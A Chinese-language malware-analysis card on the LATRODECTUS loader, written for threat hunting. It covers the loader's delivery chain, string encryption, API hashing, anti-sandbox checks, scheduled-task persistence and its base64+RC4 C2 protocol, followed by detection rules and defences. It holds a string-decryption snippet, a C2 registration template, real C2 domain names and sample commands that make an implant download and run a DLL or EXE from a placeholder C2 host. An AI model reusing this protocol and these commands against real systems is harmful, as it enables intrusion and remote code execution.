---
id: code-analysis-reverse-windows-latrodectus-loader-behavior-c2
title: LATRODECTUS 加载器分析：伪装 Bitdefender 驱动、CRC32 动态 API 解析、反沙箱组合、COM 计划任务持久化与 base64+RC4 C2 命令处理
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: latrodectus-loader-behavior-c2-protocol
aliases:
- LATRODECTUS
- ICEDID 替代品
- LATRODECTUS 加载器
- 伪装 TRUFOS.DLL
- LATRODECTUS C2 协议
- LATRODECTUS 命令处理程序
- Latrodectus 威胁狩猎
tags:
- windows
- malware-analysis
- latrodectus
- icedid
- loader
- api-hashing
- crc32
- anti-sandbox
- scheduled-task
- rc4
- c2
- threat-hunting
- yara
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V393
  verified_at: '2026-11-09T11:34:34+08:00'
  notes: 已对照原文与47张图核对：TRUFOS.DLL 伪装、4导出同地址、6字节头字符串算法、PEB+CRC32与System32通配解析、BeingDebugged/进程数+OS阈值/WOW64/MAC 反沙箱、mutex runnung、HWID×0x19660D、FNV活动ID、AppData落盘、COM ITaskService Updater 登录任务、base64+RC4(12345) /live/ 协议、CLEARURL/URLS/COMMAND/ERROR 分派与各 handler(#2/#3/#4/#12/#13/#14/#15/#17/#18/#19/#20)、bp.dat ICEDID 投放均与图一致；仓内已有 TaskScheduler COM 专卡，家族卡仅作叙事背景不构成重复；原文为威胁狩猎分析无受影响版本；未复跑样本。计划任务 Actions 具体命令原文图未展示，rundll32 run 为按家族行为的合理推断。未发现需拆分
---

## 一句话结论

LATRODECTUS 是 2023 年末出现、被视为 ICEDID 潜在替代品的 Windows 加载器：样本伪装成 Bitdefender 的 `TRUFOS.DLL` 并以压缩形式投递，解包后是 4 个导出指向同一地址的 DLL；它用自定义算法加密全部字符串、经 PEB+CRC32 与 System32 通配搜索动态解析 API、执行 PEB 调试标志/进程数+OS 版本/WOW64/MAC 组合反沙箱检查，复制到 `%AppData%\Roaming\Custom_update\Update_<HWID>.dll` 并通过 COM `ITaskService` 注册登录触发的计划任务 `Updater`，随后以 base64+RC4（口令 `12345`）的 HTTP 协议回连 C2，用 11 个命令处理程序完成信息收集、PE/DLL/shellcode 下载执行、更新自删除以及 ICEDID 载荷投放。

## 原理

- **投递链**：垃圾邮件附件是超大的 JavaScript 滴管，脚本经 WMI 挂载远程 WebDAV 共享并调用 `msiexec` 安装 MSI；MSI 释放 DLL，再由 rundll32（常借 Advanced Installer 的 viewer.exe 宿主）加载 LATRODECTUS 主 DLL。
- **静态特征**：样本文件版本信息伪装成 Bitdefender Antivirus 组件（Product/Bitdefender、Original Name `TRUFOS.DLL`）；UnpacMe 可自动解包（695KB falcon2.dll → 59KB 主体）。解包后的 DLL 有 `extra/follower/run/scub` 四个导出，导出地址全部相同（ICEDID 家族常见手法，增加分析噪声）。
- **字符串加密**：所有字符串以 6 字节头 + 密文存储——前 4 字节为 u32 `x`、后 2 字节为 u16 `y`，长度取 `(x ^ y) & 0xFFFF`，第 i 个明文字节为 `((x + i + 1) ^ 密文字节) & 0xFF`；解密脚本与 IDA 注释工具可实现批量还原，详见 [[code-analysis-reverse-obfuscation-latrodectus-string-decrypt]]。
- **动态 API 解析**：启动时读 PEB 的模块链表，用 CRC32 校验和匹配 `kernel32.dll`/`ntdll.dll` 及其导出函数；其余库（user32、wininet 等）不存名字，而是在 `%SystemRoot%\System32` 下用 `FindFirstFileW("*.dll")`/`FindNextFileW` 枚举，对每个文件名（宽字符、长度×2 字节）算 CRC32 与常量比对，命中后 `LoadLibraryW`，详见 [[code-analysis-reverse-obfuscation-wildcard-dll-crc32-resolution]]。
- **反分析组合**：
  - `GetPEB()->BeingDebugged` 为真则退出；
  - 进程数 + OS 版本双阈值：进程数 <75 且 OS 版本 ≥6（Win10/Server2016/Win11）退出；进程数 <50 且版本 <6（XP/2003/Win7/Win8/2012 等）退出——用来避开进程数很少的沙箱；
  - `IsWow64Process` 为真（32 位进程跑在 64 位系统）退出；
  - `GetAdaptersInfo` 检查有效 MAC（`AddressLength <= 6` 的适配器跳过），无有效 MAC 退出。
  - OS 版本由 `RtlGetVersion`/`GetVersionExW` 归一化成自定义枚举（5→1、6.1→3、6.2→4、6.3→5、10 且 build ≥22000→7、其余 10→6）参与阈值判断。
- **互斥体与标识**：创建互斥体 `runnung`（原文如此，疑为拼写错误）防重复感染；HWID 由卷序列号经 `×0x19660D` 的 `SerialNumberCalculation` 派生 8 个值；活动 ID 用 FNV-1a（`hash = 0x1000193 * (byte ^ hash)`）对解密出的活动名（样本为 `Littlehw`）求哈希，作为 C2 注册字段 `group`。
- **持久化**：把自身复制到配置目录（样本为 `%AppData%\Roaming\Custom_update\`，文件名 `Update_<HWID>.dll`），并通过 COM 调用 `CoCreateInstance(CLSID_TaskScheduler, IID_ITaskService)` → `Connect` → `GetFolder` 注册名为 `Updater` 的计划任务，触发器为“登录时”，任务以 rundll32 执行该 DLL 的 `run` 导出。
- **C2 协议**：HTTPS POST 到 `/live/`，请求体为 base64(RC4(明文))，RC4 口令硬编码 `12345`；首个注册请求字段为 `counter/type/guid/os/arch/username/group/ver/up/direction/mac/computername/domain`（管道/&连接），后续响应为管道分隔的对象类型 `CLEARURL|URLS|COMMAND|ERROR`，`COMMAND|<id>|<参数>` 交给处理程序分派。
- **命令处理程序**：#2 桌面文件列表（desklinks）、#3 进程祖先（CreateToolhelp32Snapshot + Process32First/Next，输出父子/孙 JSON）、#4 系统信息（ipconfig/systeminfo/nltest/net view/net group/wmic 杀软查询/whoami 等命令，输出按字段回传）、#12 下载 PE 到随机名并 StartNewProcess、#13 下载 DLL 并用 rundll32 调指定导出、#14 下载 shellcode 后 VirtualAlloc(RX)+CreateThread 执行、#15 更新并借助自删除替换自身后重启、#17 ExitProcess、#18 下载 ICEDID 加载器与加密载荷（`bp.dat`）并用 rundll32 `init -zzzz="<dir>\<rand>.dat"` 执行、#19 调整信标超时（光标位置×GetTickCount 作为随机种子，RtlRandomEx 生成 450–600 秒或 1500–2100 秒抖动）、#20 重置请求计数器。
- **与 ICEDID 的联系**：系统发现命令集相同、导出同地址、C2 字段以变量拼接、handler #18 直接投放 ICEDID（`bp.dat` 解密后是前置 129 字节垃圾 + 自定义节头的 ICEDID `license.dat`），被判断为 ICEDID 的潜在替代/演进分支。

## 触发条件

- 目标是可出网、可运行未签名 DLL 的 Windows 主机；攻击者通过钓鱼邮件投递超大 JS→WMI→WebDAV MSI 链。
- 主机进程数、OS 版本、位数、MAC 满足反沙箱检查（真实办公终端通常满足）。
- 有可写的 `%AppData%` 与可创建登录计划任务的权限（普通用户即可）。
- C2 域名可达（样本使用 `aytobusesre.com`、`scifimond.com` 等）。

## 利用步骤

1. 投递：JS 滴管经 WMI 调用 msiexec 安装 WebDAV 上的 MSI，释放并 rundll32 加载 LATRODECTUS DLL。
2. 初始化：解密字符串与 C2 配置；动态解析 API；通过反分析组合检查。
3. 落盘与持久化：生成 HWID，复制自身到 `%AppData%\Roaming\<配置目录>\Update_<HWID>.dll`，COM 注册登录触发的计划任务。
4. 注册与轮询：base64+RC4 加密注册信息 POST `/live/`，解析 C2 返回的管道对象。
5. 按命令执行：收集桌面/进程/系统信息，下载执行 PE/DLL/shellcode，更新或投放 ICEDID；#15 更新时用 ADS 自删除清理旧文件（见 [[code-analysis-reverse-windows-self-delete-ads-wtfbbq]]）。

## PoC

字符串解密（最小复刻）：

```python
import struct

def decrypt(blob: bytes) -> bytes:
    x = struct.unpack("<I", blob[:4])[0]
    y = struct.unpack("<H", blob[4:6])[0]
    n = (x ^ y) & 0xFFFF
    return bytes(((x + i + 1) ^ b) & 0xFF for i, b in enumerate(blob[6:6 + n]))
```

C2 请求构造（注册字段示例，内容为明文，实际发送前 RC4(口令 12345)+Base64）：

```text
counter=0&type=1&guid=<HWID>&os=6&arch=1&username=user&group=<FNV(活动名)>&ver=1.1&up=4&direction=<C2域>&mac=<MAC>&computername=<主机名>&domain=-
```

命令示例（明文 → 发送前加密）：

```text
COMMAND|13|http://<C2>/dll, ShowMessage
COMMAND|12|http://<C2>/test.exe
```

## 变体与关联

- 关联：字符串解密算法见 [[code-analysis-reverse-obfuscation-latrodectus-string-decrypt]]；System32 通配 + CRC32 的 DLL 解析见 [[code-analysis-reverse-obfuscation-wildcard-dll-crc32-resolution]]；ADS 自删除见 [[code-analysis-reverse-windows-self-delete-ads-wtfbbq]]。
- 关联：CRC32 API hash 的通用还原方法见 [[code-analysis-reverse-obfuscation-dridex-api-hash-crc32-xor-key]]（Dridex 在哈希上再加固定 XOR，本家族为裸 CRC32）。
- 变体：配置目录/文件名、活动名、C2 均从加密字符串解出，不同样本只需替换解密后的配置；handler #18 的 ICEDID 投放存在但野外使用未确认。
- 变体：命令处理程序仍在增加（#2 桌面列表、#3 进程祖先为后期加入），分析时以解密出的分派表为准，不要依赖固定 handler 表。

## 检测与防御

- 检测：超大 JavaScript（平均 >800KB）执行、WMI 客户端挂载 WebDAV/调用 msiexec、msiexec 安装远程 MSI、rundll32 从 AppData/未备份内存加载 DLL、可疑计划任务（rundll32 创建、登录触发）、运行中可执行文件自删除、rundll32 的高频外联（Elastic 规则与 EQL/ES|QL 示例见下）。
- EQL（思路）：`sequence by process.entity_id with maxspan=1s [file where event.action=="creation" and process.name=="rundll32.exe" and file.Ext.header_bytes:"4d5a*" and file.path:"?:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*"] [network where process.name=="rundll32.exe" and event.action:("disconnect_received","connection_attempted") and not cidrmatch(destination.ip, 内网/保留网段...)]`。
- ES|QL（思路）：统计 `process.name=="rundll32.exe"` 且目的地址为公网的外联次数/时长，`count_connections >= 100` 作为长期高频信标告警。
- YARA：可用家族规则（多字节特征如字符串解密循环、`crc32_loadlibrary`、`delete_self`、`handler_check`、`hwid_calc` 等“2 of them”组合）扫描内存与磁盘；ICEDID 侧可用 `Windows_Trojan_IcedID_*` 规则扫描 rundll32 子进程内存。
- 防御：邮件网关拦截超大 JS/WebDAV MSI；限制普通用户创建登录计划任务与 rundll32 网络外联；监控 `%AppData%` 下随机 DLL 的加载；对 rundll32 加载未备份内存 DLL 做行为阻断；威胁狩猎时同时排查 ICEDID 痕迹。
